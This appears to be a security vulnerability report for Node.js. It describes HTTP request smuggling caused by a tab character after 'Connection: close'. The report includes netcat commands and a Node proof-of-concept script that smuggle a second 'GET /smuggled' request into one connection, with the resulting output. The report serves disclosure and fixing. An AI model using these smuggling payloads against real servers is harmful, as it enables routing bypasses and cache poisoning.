## Details
**Summary:** Node's HTTP server ignores `Connection: close` when the token is followed by a tab character, so bytes after the request body can be parsed as a second request on the same connection.

**Description:** I found a parsing difference in Node's HTTP/1 handling for the `Connection` header.

`Connection: close` works as expected: after the request body, Node does not accept another request on that connection. `Connection: close ` with a trailing space also works as expected.

But `Connection: close\t` behaves differently. Node does not apply the `close` connection option, keeps the connection alive, and parses the bytes immediately after the first request body as another HTTP request. In my test, a single TCP write containing a POST followed by `GET /smuggled` results in the application receiving two request events.

This looks like it comes from llhttp's `Connection` token parser. After recognizing `close`, the parser accepts comma, space, CR, and LF, but not HTAB. The HTAB path falls back in a way that drops the pending `CONNECTION_CLOSE` state.

Although the root cause appears to be in llhttp, this report is for Node.js because the behavior is reachable through Node's default `http.createServer()` API with attacker-controlled inbound network data.

Relevant code:

## Steps To Reproduce

I reproduced this with Node.js v24.13.1, v24.15.0, and v26.1.0 using default `http.createServer()` settings.

### Manual Reproduction Without Script

Terminal 1: start a default Node HTTP server.

```bash
node -e "require('http').createServer((req,res)=>{console.log('request:', req.url); req.resume(); res.end('ok');}).listen(8080,'127.0.0.1',()=>console.log('listening'))"
```

Terminal 2: send the control case with normal `Connection: close`.

```bash
printf 'POST /first HTTP/1.1\r\nHost: victim\r\nContent-Length: 4\r\nConnection: close\r\n\r\n1234GET /smuggled HTTP/1.1\r\nHost: victim\r\n\r\n' | nc -w 2 127.0.0.1 8080
```

Expected server output in Terminal 1:

```text
request: /first
```

Terminal 2: send the second control case with `Connection: close ` and a trailing space.

```bash
printf 'POST /first HTTP/1.1\r\nHost: victim\r\nContent-Length: 4\r\nConnection: close \r\n\r\n1234GET /smuggled HTTP/1.1\r\nHost: victim\r\n\r\n' | nc -w 2 127.0.0.1 8080
```

Expected server output in Terminal 1:

```text
request: /first
```

Terminal 2: send the vulnerable case with a tab after `close`.

```bash
printf 'POST /first HTTP/1.1\r\nHost: victim\r\nContent-Length: 4\r\nConnection: close\t\r\n\r\n1234GET /smuggled HTTP/1.1\r\nHost: victim\r\n\r\n' | nc -w 2 127.0.0.1 8080
```

Unexpected server output in Terminal 1:

```text
request: /first
request: /smuggled
```

The only difference is `Connection: close` versus `Connection: close\t`. I tested this manual reproduction with WSL `nc` against Node.js v24.15.0 and v26.1.0.

### Optional Script Reproduction

Save this as `node_connection_close_tab_e2e.js`.

```js
const http = require('http');
const net = require('net');

const cases = [
  ['normal-close', 'Connection: close\r\n'],
  ['space-after-close', 'Connection: close \r\n'],
  ['tab-after-close', 'Connection: close\t\r\n'],
];

function sendRaw(port, connectionLine, expectedResponses) {
  return new Promise((resolve) => {
    const socket = net.createConnection({ port, host: '127.0.0.1' });
    let data = '';
    let settled = false;

    function finish() {
      if (settled) return;
      settled = true;
      socket.destroy();
      resolve(data);
    }

    socket.on('data', (chunk) => {
      data += chunk.toString('latin1');
      const count = [...data.matchAll(/HTTP\/1\.1 \d+/g)].length;
      if (count >= expectedResponses) {
        finish();
      }
    });
    socket.on('close', finish);
    socket.on('connect', () => {
      socket.write(
        'POST /first HTTP/1.1\r\n' +
        'Host: victim\r\n' +
        'Content-Length: 4\r\n' +
        connectionLine +
        '\r\n' +
        '1234' +
        'GET /smuggled HTTP/1.1\r\n' +
        'Host: victim\r\n' +
        '\r\n',
        'latin1',
      );
    });
  });
}

async function runCase(name, connectionLine) {
  const seen = [];
  const server = http.createServer((req, res) => {
    seen.push(req.url);
    req.resume();
    res.end('ok');
  });

  await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));
  const port = server.address().port;
  const expectedResponses = name === 'tab-after-close' ? 2 : 1;
  const response = await sendRaw(port, connectionLine, expectedResponses);
  await new Promise((resolve) => server.close(resolve));

  console.log(`CASE ${name}`);
  console.log(`  seen=${JSON.stringify(seen)}`);
  console.log(`  response_statuses=${JSON.stringify([...response.matchAll(/HTTP\/1\.1 (\d+)/g)].map((m) => m[1]))}`);
}

(async () => {
  for (const [name, connectionLine] of cases) {
    await runCase(name, connectionLine);
  }
})().catch((err) => {
  console.error(err);
  process.exitCode = 1;
});
```

Run it:

```bash
node node_connection_close_tab_e2e.js
```

Output:

```text
CASE normal-close
  seen=["/first"]
  response_statuses=["200"]
CASE space-after-close
  seen=["/first"]
  response_statuses=["200"]
CASE tab-after-close
  seen=["/first","/smuggled"]
  response_statuses=["200","200"]
```

The only difference between the safe case and the unsafe case is the trailing tab after `close`.

## Supporting Material/References

- RFC 9110 defines optional whitespace as `SP / HTAB`: https://www.rfc-editor.org/rfc/rfc9110#section-5.6.3
- RFC 9110 `Connection` header: https://www.rfc-editor.org/rfc/rfc9110#section-7.6.1

## Impact

A remote unauthenticated client can send one TCP payload that Node exposes to the application as two HTTP requests, even though the first request uses `Connection: close`. In other words, the attacker can inject an extra request into a connection that should have been closed after the first request.

This can break assumptions in servers, reverse proxies, and gateways that rely on `Connection: close` to delimit a connection after a request. In a multi-hop setup, a frontend or peer that treats `Connection: close<TAB>` as `Connection: close` can become desynchronized from Node, while Node continues parsing the attacker-controlled trailing bytes as a new request.

The practical impact is HTTP request smuggling / request queue desynchronization. Depending on deployment, this can lead to routing bypasses, cache poisoning, or the injected request being processed under connection-level assumptions that were intended only for the previous request. I have not assumed a specific proxy product or application authorization bug; the PoC demonstrates the underlying Node HTTP parser behavior needed for such chains.
